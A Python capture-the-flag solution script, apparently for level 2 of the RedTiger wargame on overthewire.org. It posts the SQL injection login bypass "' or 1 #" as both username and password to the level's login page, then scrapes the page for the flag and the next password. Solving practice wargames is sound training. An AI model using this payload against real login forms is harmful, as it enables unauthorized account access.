import requests
from requests.exceptions import HTTPError
import pickle
from bs4 import BeautifulSoup
import re


def get_request(url: str, param: dict, cook={}, method='get') -> str:
    try:
        response = (requests.get(url, params=param, cookies=cook)
                    if method == 'get' else
                    requests.post(url, data=param, cookies=cook))
        response.raise_for_status()
    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')
    else:
        return response.text


def extract_pass(response: str):
    soup = BeautifulSoup(response.replace('<b>', ''), 'html.parser')
    print(soup.find_all(string=re.compile("flag")))
    passw = soup.find(string=re.compile("password"))
    return passw


def main():
    pass_r = 'The password for the next level is: '

    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
        if 'level2login' not in cooks:
            print('use level 1')
            exit(1)
    except:
        print('use level 1')
        exit(1)

    url = "https://redtiger.labs.overthewire.org/level2.php"

    param = dict(
        username="' or 1 #",
        password="' or 1 #",
        login="Login"
    )

    cook = dict(level2login=cooks['level2login'])
    response = get_request(url, param, cook, method='post')
    passw = extract_pass(response).replace(pass_r, '')
    print('password:', passw)
    if ('level3login' not in cooks) or (cooks['level3login'] != passw):
        cooks['level3login'] = passw
    with open('cooks.pickle', 'wb') as f:
        pickle.dump(cooks, f)


if __name__ == '__main__':
    main()
